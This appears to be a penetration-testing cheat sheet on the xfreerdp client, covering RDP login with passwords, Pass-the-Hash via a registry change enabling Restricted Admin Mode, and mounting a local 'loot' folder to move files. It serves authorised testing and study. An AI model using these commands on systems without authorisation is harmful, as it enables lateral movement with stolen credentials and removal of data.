---
tool: xfreerdp
slug: xfreerdp
kind: tool
stages: [post-compromise]
targets: [windows]
category: RDP client (connect, Pass-the-Hash, mount)
platforms: [linux, windows, network]
services: [rdp]
ports: [3389]
tags: [rdp, pass-the-hash, restricted-admin, remote-desktop, clipboard, file-transfer]
attack: [T1021.001, T1550.002]
summary: The Linux RDP client of choice. Connect with a password or Pass-the-Hash, mount a local drive for file transfer, share the clipboard, and skip the certificate warning. The quiet GUI route onto a Windows host once you have a credential or a hash.
references:
  - FreeRDP command-line interface | https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
  - HackTricks: pentesting RDP | https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html
---

## When to reach for it

A credential or an NTLM hash and 3389 open, when you want a full desktop rather than a shell. For the attack side of RDP (brute, session hijack) see the [RDP access](/cpts/#tool-rdp-access) and [attacking common services](/cpts/#tool-attacking-services) notes; this is the client itself.

## Connect

```bash
xfreerdp /v:TARGET /u:user /p:'Password1' /dynamic-resolution
xfreerdp /v:TARGET /u:'DOMAIN\user' /p:pass /cert:ignore
```

## Pass the Hash (Restricted Admin)

RDP accepts an NTLM hash when Restricted Admin Mode is on; enable it on the target first (Pass-the-Hash over RDP).

```bash
# on the target, once: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
xfreerdp /v:TARGET /u:administrator /pth:NTHASH
```

## Transfer files and clipboard

```bash
xfreerdp /v:TARGET /u:user /p:pass /drive:loot,/home/you/loot   # mount a local dir as a drive
# +clipboard is on by default, so you can copy-paste text and files
```

## Useful flags

- `/cert:ignore` (or `/cert-ignore` on older builds): skip the certificate-name-mismatch warning.
- `/dynamic-resolution`, `/f` fullscreen, `/size:1440x900`.
- `/drive:name,path`: mount a folder for two-way file transfer; `+clipboard` for copy-paste.
- `/sound` `/microphone`, `/gfx:AVC444` for smoother sessions over a slow link.
- `/d:DOMAIN` as an alternative to `DOMAIN\user`.

## Notes

RDP is interactive and writes a clear logon event (4624/4625), and Pass-the-Hash over RDP needs Restricted Admin Mode, which itself weakens the host and may be flagged. Connect only to systems you are authorised to test, and note the account and method for the report.
